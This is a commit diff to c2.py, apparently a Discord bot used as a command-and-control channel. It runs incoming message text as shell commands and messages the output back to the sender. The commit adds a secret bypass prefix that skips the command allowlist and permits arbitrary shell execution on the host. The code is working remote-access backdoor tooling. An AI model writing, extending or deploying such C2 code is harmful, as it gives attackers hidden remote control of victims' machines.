e515bffbf621803479b6af44cb9c31f575ad74e9
DirWalk <>
2020-11-27 07:30:11 -0500

    Added the ability to send in a server bypass code if you need temporary functionality.

--- c2.py
+++ c2.py
@@ -9,18 +9,26 @@ class DiscordC2(discord.Client):
     async def on_message(self, message):
         if message.author.bot:
             return
-        cmd = '{0.content}'.format(message)
         """
         Current if statement to allow for only authorized commands by the server.
         It should be possible to import this from an external file.
         """
         if message.content in AUTHORIZED_COMMANDS:
-            p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                 stderr=subprocess.STDOUT, close_fds=True)
-            result = p.stdout.read().decode("utf-8")
+            cmd = '{0.content}'.format(message)
+            result = self.cmd_process(cmd)
+            await message.author.send(result)
+        elif message.content.startswith(BYPASS_CODE):
+            cmd = '{0.content}'.format(message).replace(BYPASS_CODE, '', 1)
+            result = self.cmd_process(cmd)
             await message.author.send(result)
         else:
             await message.author.send('Not an authorized command.')
+
+    def cmd_process(self, cmd):
+        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, close_fds=True)
+        result = p.stdout.read().decode("utf-8")
+        return result
 
 
 def main():
